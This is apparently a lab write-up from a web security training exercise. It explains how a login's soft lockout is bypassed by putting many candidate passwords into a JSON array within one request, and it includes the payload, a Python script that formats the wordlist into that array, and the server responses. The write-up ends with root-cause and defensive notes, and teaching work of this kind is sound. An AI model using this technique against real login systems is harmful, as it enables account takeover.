# Lab: Broken brute-force protection, multiple credentials per request

**Difficulty:** Expert

**Status:** Solved



## Overview



This lab is vulnerable to a logic flaw in its brute-force protection.



The application uses a soft lockout mechanism to prevent repeated failed login attempts. However, the protection counts 
**HTTP requests**, rather than the number of password attempts processed inside each request.



The goal is to exploit this behavior, brute-force Carlos's password, and access his account.



---



## Concept




Normally, the login request contains a single password:



```json

{

    "username": "carlos",

    "password": "test"

}

```



After several failed attempts, the application temporarily locks the user out.



The interesting part is that the `password` parameter also accepts an **array of values**:



```json

{

    "username": "carlos",

    "password": ["test", "test1", "test2"]

}

```



This means multiple passwords can be tested using a single HTTP request.



---



## Finding the Logic Flaw



First, I sent a normal login request with an invalid password.



After several failed attempts, the application triggered a temporary lockout.



I then changed the `password` parameter from a string to an array:



```json

{

    "username": "carlos",
    "password": ["test", "test1", "test2"]

}

```



The server accepted the request and returned:



```text

200 OK

Invalid username or password

```



This confirmed that the application was processing the array instead of rejecting the request because of the unexpected 
data type.



---



## Exploitation



The lab provides a list of candidate passwords.



Instead of sending one request for every password:



```text

Request → Password 1

Request → Password 2

Request → Password 3

...

```



I placed all candidate passwords inside the `password` array:



```json

{

    "username": "carlos",

    "password": [

        "password1",

        "password2",

        "password3",

        "..."

    ]

}

```



I used a small Python script to convert the password list into the required format:



```python
print("[", end='')



with open('passwords.txt', 'r') as f:

    lines = f.readlines()



for pwd in lines:

    print('"' + pwd.rstrip("\n") + '",', end='')



print('"random"]', end='')

```



The script formats the wordlist as a JSON-style array that can be inserted into the request.



---



## Result



After sending the request containing all candidate passwords, the server returned:



```text

302 Found

Location: /my-account

```



This indicated that one of the supplied passwords was correct and that an authenticated session had been created.



I then used the authenticated session ID to access:



```text

/my-account

```



The page was authenticated as `carlos`, and the lab was solved successfully. ✅




---



## Root Cause



The root cause is a **logic flaw in the brute-force protection**.



The protection effectively assumes:



```text

1 HTTP request = 1 password attempt

```



But the application allows:



```text

1 HTTP request = multiple password attempts

```



Therefore, the soft lockout mechanism can be bypassed by supplying multiple credentials in a single request.



---



## Key Takeaway



Brute-force protection should not rely only on the number of HTTP requests.



If an application accepts multiple credentials in a single request, each individual authentication attempt should be 
accounted for by the protection mechanism.



This lab is a good example of how an application can have a security control in place but still be vulnerable because of 
a **logic flaw in how that control is implemented**.



---



## Tools



* Burp Suite Proxy

* Burp Repeater

* Python



**Burp Intruder was not required**, because the exploit relies on sending multiple passwords inside a single request.

